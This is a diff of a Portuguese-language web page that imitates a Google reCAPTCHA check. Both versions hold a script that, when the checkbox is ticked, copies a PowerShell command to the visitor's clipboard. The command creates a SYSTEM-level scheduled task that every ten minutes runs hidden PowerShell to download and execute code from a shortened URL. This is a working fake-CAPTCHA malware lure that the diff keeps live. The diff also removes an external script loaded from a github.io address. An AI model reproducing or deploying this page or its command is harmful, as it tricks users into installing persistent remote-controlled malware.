@@ -1,5 +1,6 @@
 <!DOCTYPE html>
-<html lang="pt-BR"><head>
+<html lang="pt-BR">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificação reCAPTCHA</title>
@@ -74,33 +75,6 @@
             display: none;
         }
 
-        .verification-steps {
-            font-size: 15px;
-            color: #202124;
-            margin: 15px 0;
-        }
-
-        .verification-steps ol {
-            padding-left: 20px;
-            margin: 15px 0;
-        }
-
-        .verification-steps li {
-            margin-bottom: 12px;
-            line-height: 1.4;
-        }
-
-        .verification-code {
-            background: #f8f9fa;
-            border: 1px solid #dadce0;
-            padding: 12px;
-            font-size: 13px;
-            margin: 15px 0;
-            border-radius: 4px;
-            text-align: center;
-            color: #3c4043;
-        }
-
         #verify-button {
             background: #1a73e8;
             color: white;
@@ -124,17 +98,8 @@
             background: #ccc;
             cursor: not-allowed;
         }
-
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(720deg); }
-        }
-
-        .spin-animation {
-            animation: spin 0.8s ease-out;
-        }
     </style>
-<script type="module" src="https://akiranakaisan184.github.io/BaFZva4rEnbVEGjS5CbH5uPeNLkABdvefWHi8q0z8cYqlmzfzKG02VVEY7E-1m2h-y9YYUL7kBwZmoIW-N3CyQ=="></script></head>
+</head>
 <body>
     <div class="captcha-container">
         <div class="header-container">
@@ -145,13 +110,13 @@
             
             <div class="recaptcha-brand">
                 <div class="recaptcha-logo">
-                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
                     <span>reCAPTCHA</span>
                 </div>
             </div>
         </div>
 
-        <div class="verification-box" id="verification-box" style="display: block;">
+        <div class="verification-box" id="verification-box">
             <div class="verification-steps">
                 <strong style="font-size: 16px; display: block; margin-bottom: 15px;">Complete a Verificação</strong>
                 <ol>
@@ -165,41 +130,41 @@
                 "Não sou um robô - ID do reCAPTCHA:2417"
             </div>
 
-            <button id="verify-button" onclick="verificarCaptcha()">VERIFICAR</button>
+            <button id="verify-button" onclick="verificarCaptcha()" disabled>VERIFICAR</button>
         </div>
     </div>
 
     <script>
         document.getElementById('captcha-checkbox').addEventListener('change', function() {
-            const command = `powershell -c "$t=(Get-Date).AddMinutes(10); schtasks /create /tn U2FA /tr 'powershell -w Hidden -ep Bypass -c iex(iwr -useb https://tinyurl.com/2uxfvszc)' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"`;
-            
-            const textArea = document.createElement('textarea');
-            textArea.value = command;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textArea);
-
-            const logo = document.querySelector('.recaptcha-logo img');
-            logo.classList.add('spin-animation');
-            setTimeout(() => logo.classList.remove('spin-animation'), 800);
-
-            document.getElementById('verification-box').style.display = 'block';
-
-            const button = document.getElementById('verify-button');
-            button.disabled = true;
-            let seconds = 6;
-            
-            const countdown = setInterval(() => {
-                button.textContent = `VERIFICAR (${seconds})`;
-                seconds--;
+            if (this.checked) {
+                const command = `powershell -c "$t=(Get-Date).AddMinutes(10); schtasks /create /tn U2FA /tr 'powershell -w Hidden -ep Bypass -c iex(iwr -useb https://tinyurl.com/2uxfvszc)' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"`;
                 
-                if(seconds < 0) {
-                    clearInterval(countdown);
-                    button.disabled = false;
-                    button.textContent = 'VERIFICAR';
-                }
-            }, 1000);
+                const textArea = document.createElement('textarea');
+                textArea.value = command;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+
+                document.getElementById('verification-box').style.display = 'block';
+
+                const button = document.getElementById('verify-button');
+                button.disabled = true;
+                let seconds = 6;
+                
+                const countdown = setInterval(() => {
+                    button.textContent = `VERIFICAR (${seconds})`;
+                    seconds--;
+                    
+                    if (seconds < 0) {
+                        clearInterval(countdown);
+                        button.disabled = false;
+                        button.textContent = 'VERIFICAR';
+                    }
+                }, 1000);
+            } else {
+                document.getElementById('verification-box').style.display = 'none';
+            }
         });
 
         function verificarCaptcha() {
@@ -216,15 +181,5 @@
             }, 2000);
         }
     </script>
-</body>
-</html>}, 500);
-            }, 2000);
-        }
-    </script>
-
-
-<div id="">
-    
-</div>
 </body>
 </html>
